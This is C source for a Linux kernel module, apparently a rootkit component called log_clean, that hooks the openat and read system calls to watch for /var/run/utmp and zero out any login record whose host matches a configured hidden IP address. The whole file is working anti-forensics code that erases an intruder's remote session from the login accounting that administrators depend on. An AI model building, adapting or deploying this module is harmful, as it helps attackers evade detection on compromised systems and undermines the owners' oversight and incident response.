//
// Created by sciver on 10/20/22.
//

#include "log_clean.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("CWZ");
MODULE_DESCRIPTION("Hiding logged in IPv4, test on Ubuntu64 20.04.5 LTS|5.4.0-131-generic");
MODULE_VERSION("0.04");

/*
 * This will store the file descriptor that we are going to tamper pread64()'s to
 */
int tamper_fd;

asmlinkage long (*orig_openat)(const struct pt_regs *);
asmlinkage long (*orig_read)(const struct pt_regs *);


/*
 * The hook for sys_openat()
 * We have to check which filename is being opened. If it matches "/var/run/utmp",
 * then we store the file descriptor (return value) in tamper_fd for later.
 */
asmlinkage int hook_openat(const struct pt_regs *regs)
{
    //int dfd = regs->di;
    char *filename = (char *)regs->si;
    //int flags = regs->dx;
    //umode_t mode = regs->r10;

    char *kbuf;
    long error;
    char *target = "/var/run/utmp";
    int target_len = 14;

    /*
     * We need a buffer to copy filename into
     */
    kbuf = kzalloc(NAME_MAX, GFP_KERNEL);
    if(kbuf == NULL)
        return orig_openat(regs);

    /*
     * Copy filename from userspace into our kernel buffer
     */
    error = copy_from_user(kbuf, filename, NAME_MAX);
    if(error)
        return orig_openat(regs);

    /*
     * Compare filename to "/var/run/utmp"
     */
    if( memcmp(kbuf, target, target_len) == 0 )
    {
        /*
         * Save the file descriptor in tamper_fd, clean up and return
         */
        tamper_fd = orig_openat(regs);
        kfree(kbuf);
        return tamper_fd;
    }

    /*
     * Clean up and return
     */
    kfree(kbuf);
    return orig_openat(regs);
}

/*
 * The hook for sys_pread64()
 * First, we check if the file descriptor is the one stored in tamper_fd.
 * If it is, then we call the real sys_pread64(), copy the buffer into the kernel,
 * and check if the ut_user entry of the utmp struct is the user we want to hide.
 * Finally, if it matches, then we will the buffer with 0x0 before copying it back
 * to userspace and returning.
 */
asmlinkage int hook_read(const struct pt_regs *regs)
{
    int fd = regs->di;
    char *buf = (char *)regs->si;
    size_t count = regs->dx;
    //loff_t pos = regs->r10;

    char *kbuf;
    struct utmp *utmp_buf;
    long error;
    int i, ret;

    /*
     * Check that we're supposed to be tampering with this fd
     * Better also be sure that tamper_fd isn't 0,1, or 2!
     */
    if ( (fd == tamper_fd) && (tamper_fd != 0) && (tamper_fd != 1) && (tamper_fd != 2) )
    {
        /*
         * Allocate a kernel buffer, and check it worked
         */
        kbuf = kzalloc(count, GFP_KERNEL);
        if (kbuf == NULL)
            return orig_read(regs);

        /*
         * Do the real syscall, so that buf gets filled for us
         */
        ret = orig_read(regs);

        /*
         * Copy buf into kbuf so we can look at it
         * If it fails, just return without doing anything
         */
        error = copy_from_user(kbuf, buf, count);
        if(error != 0)
            return ret;

        /*
         * Check if ut_user is the user we want to hide
         */
        utmp_buf = (struct utmp *)kbuf;

        /*
         *
         */
        if(HIDE)
        {
            printk("in-hook_read:HIDDEN_IP |%s|\n", HIDDEN_IP);
            if (memcmp(utmp_buf->ut_host, HIDDEN_IP, strlen(HIDDEN_IP)) == 0)
            {
                printk("pread catched!\n");
                /*
                * Overwrite kbuf with 0x0
                */
                for ( i = 0 ; i < count ; i++ )
                    kbuf[i] = 0x0;

                /*
                * Copy kbuf back to buf in userspace
                * If it fails, there's nothing we can do, so just clean up and return
                */
                error = copy_to_user(buf, kbuf, count);

                kfree(kbuf);
                return ret;
            }
        }
        /*
         * We intercepted a read to /var/run/utmp, but didn't find the user
         * we want to hide, so clean up and return
         */
        kfree(kbuf);
        return ret;
    }

    /*
     * This isn't a read to /var/run/utmp, so just return
     */
    return orig_read(regs);
}